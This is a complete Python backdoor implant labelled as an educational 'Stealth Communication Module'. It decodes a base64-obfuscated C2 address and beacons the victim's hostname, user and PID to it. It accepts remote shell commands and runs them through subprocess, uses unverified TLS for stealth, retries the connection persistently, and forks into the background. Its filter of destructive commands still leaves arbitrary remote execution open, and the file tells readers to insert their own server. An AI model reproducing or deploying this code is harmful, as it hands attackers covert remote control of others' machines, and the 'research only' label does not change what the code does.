#!/usr/bin/env python3
"""
Network Backdoor - Stealth Communication Module
Educational purposes - Security research only
"""

import base64
import socket
import subprocess
import time
import os
import sys
import random
import ssl

class StealthCommunicator:
    def __init__(self):
        # Obfuscated configuration - CHANGE THESE TO YOUR SERVER
        self.LHOST = base64.b64decode(b"MTkyLjE2OC4xLjE2Nw==").decode()  # Your C2 server IP
        self.LPORT = int(base64.b64decode(b"NDQ0NA==").decode())         # Your C2 server port
        self.retry_count = 0
        self.max_retries = 100
        
    def get_system_info(self):
        """Collect system information for beacon"""
        try:
            hostname = os.uname().nodename
            arch = os.uname().machine
            user = os.getenv('USER', 'unknown')
            
            return {
                'hostname': hostname,
                'architecture': arch,
                'user': user,
                'pid': os.getpid()
            }
        except:
            return {'status': 'unknown'}
    
    def obfuscate_data(self, data):
        """Obfuscate transmitted data"""
        if isinstance(data, dict):
            import json
            data = json.dumps(data)
        encoded = base64.b64encode(data.encode()).decode()
        return encoded
    
    def deobfuscate_data(self, data):
        """Deobfuscate received data"""
        try:
            decoded = base64.b64decode(data).decode()
            return decoded
        except:
            return data
    
    def create_connection(self):
        """Create connection to C2 server"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            
            # Optional SSL wrapping for stealth
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.LHOST)
            except:
                pass  # Continue with plain socket
            
            sock.connect((self.LHOST, self.LPORT))
            self.retry_count = 0
            return sock
            
        except Exception as e:
            return None
    
    def execute_command(self, command):
        """Execute received commands"""
        if not command or command.strip() in ['exit', 'quit', 'shutdown']:
            return "Command not permitted"
        
        try:
            # Basic command filtering for safety
            blocked_commands = ['rm -rf', 'mkfs', 'dd if=', ':(){:|:&};:']
            if any(cmd in command for cmd in blocked_commands):
                return "Blocked command"
                
            result = subprocess.run(command, shell=True, capture_output=True, 
                                  text=True, timeout=30)
            output = result.stdout + result.stderr
            return output.strip() or "No output"
        except subprocess.TimeoutExpired:
            return "Command timeout"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def send_beacon(self, sock):
        """Send system beacon to C2"""
        try:
            system_info = self.get_system_info()
            beacon_data = self.obfuscate_data({
                'type': 'beacon',
                'system': system_info,
                'status': 'active'
            })
            sock.send(beacon_data.encode() + b'\n')
            return True
        except:
            return False
    
    def communication_loop(self):
        """Main communication loop with C2"""
        while self.retry_count < self.max_retries:
            sock = self.create_connection()
            if not sock:
                # Exponential backoff on failure
                sleep_time = min(300, (2 ** self.retry_count) + random.randint(1, 10))
                time.sleep(sleep_time)
                self.retry_count += 1
                continue
            
            try:
                # Initial beacon
                if not self.send_beacon(sock):
                    continue
                
                # Command reception loop
                while True:
                    try:
                        data = sock.recv(4096)
                        if not data:
                            break
                        
                        command = self.deobfuscate_data(data.decode().strip())
                        
                        if command == 'ping':
                            sock.send(b'pong')
                        elif command.startswith('cmd:'):
                            cmd = command[4:]
                            result = self.execute_command(cmd)
                            response = self.obfuscate_data(result)
                            sock.send(response.encode())
                        elif command == 'info':
                            info = self.get_system_info()
                            response = self.obfuscate_data(info)
                            sock.send(response.encode())
                        else:
                            sock.send(b'unknown_command')
                            
                    except socket.timeout:
                        # Send periodic beacon
                        self.send_beacon(sock)
                        continue
                    except Exception:
                        break
                        
            except Exception as e:
                pass
            finally:
                try:
                    sock.close()
                except:
                    pass
            
            time.sleep(30)  # Wait before reconnection
    
    def run(self):
        """Main execution method"""
        # Fork to background
        if os.fork() == 0:
            self.communication_loop()

def main():
    communicator = StealthCommunicator()
    communicator.run()

if __name__ == "__main__":
    main()






